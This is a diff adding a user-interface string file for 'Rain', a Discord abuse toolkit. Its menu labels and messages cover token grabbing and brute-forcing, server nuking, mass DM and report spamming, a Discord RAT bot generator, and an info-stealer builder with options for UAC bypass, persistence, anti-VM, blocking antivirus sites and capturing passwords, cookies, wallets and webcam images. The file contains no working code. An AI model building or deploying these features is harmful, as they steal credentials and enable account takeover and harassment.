@@ -1,0 +1,396 @@
+Token Info{end_space15}
+Token Login{end_space15}
+Token Nuker{end_space14}
+Token Grabber{end_space12}
+Token Disabler{end_space11}
+Token Brute-Force{end_space12}
+Fake Typer{end_space15}
+Vanity Sniper{end_space12}
+GroupChat Spammer{end_space8}
+Friends Blocker{end_space10}
+Friends Remover{end_space15}
+Friends Request Remover{end_space2}
+Server Creator{end_space11}
+Profile Changer{end_space10}
+QR Code grabber{end_space10}
+Discord Rat Bot{end_space10}
+Button Presser{end_space11}
+Message Reactor{end_space10}
+Mass DM{end_space18}
+Mass Report{end_space14}
+Mass Friend{end_space14}
+Dm Deleter{end_space15}
+Dm Clearer{end_space15}
+Bypass Rules{end_space13}
+Bypass RestoreCord{end_space7}
+Bypass Sledge Hammer{end_space5}
+Webhook Tool{end_space13}
+Made by Plingenn{end_space9}
+Changelog{end_space16}
+Settings{end_space17}
+{space}Chat
+Manage Tokens
+Next Page{end_space2}
+Running on:{end_space15}
+Invalid choice, please try again!
+Interrupted by user.
+Theme Changer
+Account Settings
+Proxy Settings
+Apparance Settings
+Toggle Debug Mode
+Admin Panel
+Invalid Setting
+CYAN
+BLUE
+GREEN
+RED
+WHITE
+YELLOW
+MAGENTA
+LIGHT RED
+LIGHT BLUE
+LIGHT GREEN
+LIGHT CYAN
+LIGHT BLACK
+Theme set to
+Account Overview
+My License
+Purchase History
+Redeem Code
+Download Software
+Username
+Created the
+Change Username
+Logout
+Username change failed, The username must contain at least 3 characters.
+Do you want to Logout from your Account? (Y/N)
+Product
+Expire in
+Date
+Enter your product code to get your content.
+Code
+You have already redeemed the code.
+Make sure to save your product before pressing Enter!
+Key not found in the response
+Failed to retrieve data for the provided code
+URL not found in the code information
+Invalid Code!
+Toggle Proxy Use
+Clear Proxy Cache
+Add own Proxies to Cache
+Scrape Proxy
+Invalid Choice
+Debug Mode Toggled {RED}OFF
+Debug Mode Toggled {GREEN}ON
+Added new Authentication System
+Improved Config system
+Remade Panel interface
+Added Chat system
+Added new account settings
+Implemented caching for better performance
+Custom Discord RPC
+Toggle Discord RPC
+Toggle Custom Discord RPC
+Edit Custom Discord RPC
+Custom Discord RPC Toggled OFF
+Custom Discord RPC Toggled ON
+Details (Required)
+Details must be at least 3 characters long.
+State (Required)
+State must be at least 3 characters long.
+Large image URL (Optional)
+Large text (Optional)
+Small image URL (Optional)
+Small text (Optional)
+How many buttons do you want to have?
+Enter label for Button
+Enter URL for Button
+Invalid URL format. Please enter a valid URL.
+Invalid number of buttons. Please enter a number between 0 and 2.
+Discord RPC Toggled OFF
+Discord RPC Toggled ON
+Normal Mode
+RestoreCord Mode (bypass captcha)
+Cache Checker
+Custom Checker
+Server Checker
+Enter the custom path to load tokens from
+Normal Chat
+Support Chat (Unavailable)
+Private Chat (Unavailable)
+Server Lookup{end_space12}
+Server Cloner{end_space12}
+Server Nuker{end_space13}
+Token Joiner{end_space13}
+Token Leaver{end_space13}
+Token Spammer{end_space12}
+Seizure{end_space18}
+SoundBoard Spammer{end_space7}
+Voice Chat Joiner{end_space8}
+Profile Picture Changer{end_space6}
+Global Nick Changer{end_space6}
+Server Nick Changer{end_space9}
+HypeSquad Changer{end_space8}
+Pronouns Changer{end_space9}
+Language Changer{end_space9}
+Status Changer{end_space11}
+Theme Changer{end_space12}
+Bio Changer{end_space14}
+Account Generator{end_space8}
+VideoCrash Maker{end_space9}
+Settings Cycler{end_space14}
+Patch Notes{end_space14}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+About{end_space20}
+Exit{end_space21}
+Previous Page{end_space2}
+Servers Names
+Message
+Thread Count
+An error occurred:
+No tokens were found in cache
+Deploying Rain Nuke
+Rain Nuke Deployed. . .
+Messaging
+Messaged ID:
+Sent a Message to all available friends.
+Left guild:
+Deleted guild:
+The following error has been encountered and is being ignored:
+Deleted/Left all available guilds.
+Removing friend:
+Removed friend:
+Removed all available friends.
+Creating
+Created
+Created all servers.
+Rain Nuke Successfully Detonated!
+Succesfully turned into a Reme Wasteland
+Enter anything to continue. . .
+Starting seizure mode (Switching on/off Light/dark mode)
+Not enough friends to proceed.
+An error occurred while processing token
+Channel Spammer
+Channel ID
+Rules Bypass
+Guild ID
+Token Fake Typer
+Global Nicker
+Nick Name
+Server Nicker
+Pronouns Changer
+Random Pronouns (y/n)
+Pronouns
+Deleted DM:
+Not enough DMs to proceed.
+Cycle interrupted
+Sound Board Spammer
+Program interrupted by user.
+Failed to send heartbeat with token:
+Failed to join VC with token:
+Joining VC with Tokens..
+Updated invite successfully, your server can now be accessed by
+Failed to update vanity url. Status code:
+Vanity code to snipe
+Server ID to apply vanity to
+Delay between checks (seconds)
+Vanity Sniper has started. Press Ctrl+C to stop.
+Error:
+Webhook Spammer
+Webhook Deleter
+Webhook
+Webhook successfully deleted
+Token Manager
+Save Tokens
+Clear Tokens
+Check Tokens And Only Save Valid Ones (y/n)
+Tokens Cache Emptied.
+Enter the path to the text file containing tokens
+No tokens were found in the specified text file
+Token Checker
+Failed to get server name:
+Joining
+Rain token brute-force. PS: This might take a long time to work.
+If you are extremely lucky and able to get someone's token, you'll discover it stored within 'brute-force.txt'.
+Always seek explicit permission from the individual before conducting a brute force attack on their account.
+Invalid user id, please try again!
+VALID
+INVALID
+Error fetching billing sources:
+Error fetching nitro data:
+No billing information available.
+Gathering User info & Webdrivers..
+File Name
+File Password
+Do you want to provide an icon file? (Y/N)
+Invalid icon path or URL. Setting icon to None.
+Ping Me (Y/N)
+Anti VM (Y/N)
+Put on Startup (Y/N)
+UacBypass (Y/N)
+Melt (Y/N)
+HideConsole (Y/N)
+CaptureWebcam (Y/N)
+CapturePasswords (Y/N)
+CaptureCookies (Y/N)
+CaptureAutofills (Y/N)
+CaptureHistory (Y/N)
+CaptureDiscordTokens (Y/N)
+CaptureGames (Y/N)
+CaptureWifiPasswords (Y/N)
+CaptureSystemInfo (Y/N)
+CaptureScreenshot (Y/N)
+CaptureTelegram (Y/N)
+CaptureCommonFiles (Y/N)
+CaptureWallets (Y/N)
+FakeError (Y/N)
+FakeErrorTitle
+FakeErrorMessage
+BlockAvSites (Y/N)
+DiscordInjection (Y/N)
+File Icon
+Creating {name}.exe, This will take a few seconds. Thanks for your patience!
+File is in 'output/grabberbuilder/{name}.exe
+Created groupchat
+Rate limited ({response.json()['retry_after']}ms)
+Not enough friends available for random selection
+Do you want to choose users yourself to groupchat spam or do you want to select randoms?
+Choose users yourself
+Randomize the users
+Creating groupchats
+Userids
+You didn't have any commas (,) format is id,id2,id3
+at anytime to stop
+Blocked:
+Error getting relationships:
+Not enough friend requests to proceed.
+Incoming Friend Request From:
+Removed Friend request From:
+Total Friend Requests Removed:
+An error occurred while creating {server_name}: {e}
+icon for the servers yes/no
+Random server names
+Custom server names
+Name of the servers that will be created
+Please input the icon location
+Couldn't find "{image}" on your pc
+Custom Status
+Custom Bio
+Creating File... {i}
+Writing File... {i}
+Note: This code is not in fully working condition right now, but it is still runnable.\nHowever, you might encounter errors or bugs.
+Enter the name you want to give to the final file
+Enter the token of the bot you will use to execute the RAT commands
+Bot token
+Enter the guild ID on which the slash commands are registered
+Error writing file: {e}
+File has been correctly written to "output/{fileName}.py"
+Convert your script into an executable (Y/N)
+File creation...
+Cleaning up old files...
+The executable file has been correctly generated
+HTTP error occurred: {e}
+Message id
+Please select the button you want to press
+{r}({LIGHTBLACK_EX}{i}{r}) Name: {LIGHTBLACK_EX}{button_label}{r} , Custom ID: {LIGHTBLACK_EX}{button_custom_id}
+Button
+Invalid message and or message has no buttons
+Failed to add reaction {reaction} to message {message_id}. Maximum number of reactions already reached.
+Maximum number of reactions already reached.
+Failed to add reaction {reaction} to message {message_id}. Forbidden: {error_message}
+Objects
+Faces
+Animals
+Symbols
+No emojis found in the response
+Failed to fetch emojis from the API
+Invite link
+Invalid invite link format.
+An error occurred while sending request
+Invitation Information:
+Inviter Information:
+Server Information:
+Channel
+Expiration Date
+User ID
+Badges
+Unavailable
+Name
+Server ID
+Description
+Banner
+Banner URL
+Banner URL (Unavailable)
+Vanity URL
+Verification Level
+Splash
+Splash URL
+Splash URL (Unavailable)
+Features
+Seizure Started. Press Ctrl+C to stop.
+Seizure interrupted
+Language cycling has started. Press Ctrl+C to stop.
+Invalid Token.
+Press ENTER to continue
+Discord API Tool | https://Rain.xyz | Made By Plingenn
+Appearance Settings
+Text Settings
+Cursor Settings
+Transparency Settings
+Window Settings
+Language Settings
+Color Scheme
+Font Face
+Font Size
+Line height
+Font weight
+Retro Terminal Effects
+Color Settings
+Font Settings
+Font Size Settings
+Line Height Settings
+Font Weight Settings
+Retro Settings
+Cursor Settings
+Language set to {chosen_language}
+Unnamed
+Type
+House
+Message link
+Invalid message link
+Going Back...
+Failed to connect to Discord RPC: {e}
+Choice
+Theme
+Setting
+Edit
+Language
+Panel Opacity
+Invalid Opacity
+Window Settings
+This Option Is A Work In Progress
+This option is currently unavailable. Please be patient as it will be added later.
+This option is currently unavailable.
+It will be replaced in one of the upcoming updates with: '{replacement}'.
+This Option Is Not Available
+These options are currently under in development
+These options are currently in development but remain usable. However, it's likely that bugs or errors may occur.
+Failed to fetch pronouns from {pronounce_url} ({statuscode})
+Proxy usage is currently unavailable. We apologize for any inconvenience. It will be made accessible in one of our upcoming updates.
+Proxy Use Toggled {RED}OFF
+Proxy Use Toggled {GREEN}ON
+Successfully Wrote New Proxies
+Successfully Scraped Proxies
+Done! Scraped {proxies} in total => {temp} | {execution_time}ms
+PC{end_space7}
+Implemented multi-language support.
+Mass Thread{end_space14}
+Forum Spammer
+Mass User DM{end_space13}
+N/A{end_space22}
+Server Booster{end_space16}
+Token Onliner{end_space12}
+Poll Creator{end_space13}
